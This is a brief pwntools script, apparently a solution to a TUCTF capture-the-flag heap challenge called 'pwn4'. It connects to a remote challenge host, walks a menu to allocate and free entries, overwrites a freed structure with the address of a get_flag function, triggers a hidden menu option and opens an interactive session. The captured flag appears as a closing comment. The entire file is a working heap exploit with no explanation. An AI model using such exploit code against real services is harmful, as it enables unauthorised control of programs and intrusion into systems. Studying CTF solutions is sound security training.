from pwn import *

context(log_level='debug')
get_flag = 0x4008DD

# p = process('./pwn4')
p = remote('104.196.15.126',15050)

p.recvuntil('our choice:\n')
p.sendline('3')
p.recvuntil('Brown Bear\n')
p.sendline('3')
p.recvuntil(' name:\n')
p.sendline('aaaa')

p.recvuntil('our choice:\n')
p.sendline('3')
p.recvuntil('Brown Bear\n')
p.sendline('3')
p.recvuntil(' name:\n')
p.sendline('aaaa')


# gdb.attach(p,'b*0x400D3F\nb*0x0400CB2\nc')

p.recvuntil('our choice:\n')
p.sendline('4')
p.recvuntil('want to delete?\n')
p.sendline('1')


p.recvuntil('our choice:\n')
p.sendline('2')
p.recvuntil('pian Tiger\n')
p.sendline('3')
p.recvuntil('of tiger:')
p.sendline(p64(get_flag))

p.recvuntil('our choice:\n')
p.sendline('4919')

p.interactive()

#TUCTF{H3ap_O_Fl0w_ftw}